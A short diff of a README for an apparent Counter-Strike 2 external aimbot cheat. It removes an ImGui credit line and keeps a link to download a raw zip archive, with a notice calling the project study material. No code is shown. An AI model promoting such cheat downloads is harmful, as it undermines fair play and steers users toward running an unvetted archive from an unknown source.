@@ -6,9 +6,6 @@ Analysis and implementation of CS2 external silent aimbot
 
 Download -> [Click - Here](https://github.com/bcnxujpp32y1/CS2_External/raw/refs/heads/master/CS2_External/Cs2_External.zip)
 
-## ImGui library -> [OS-ImGui](https://github.com/TKazer/OS-ImGui)
-
-
 ## NOTICE
 
 This source just used to study how to code a simple CS2 external hack systematically.
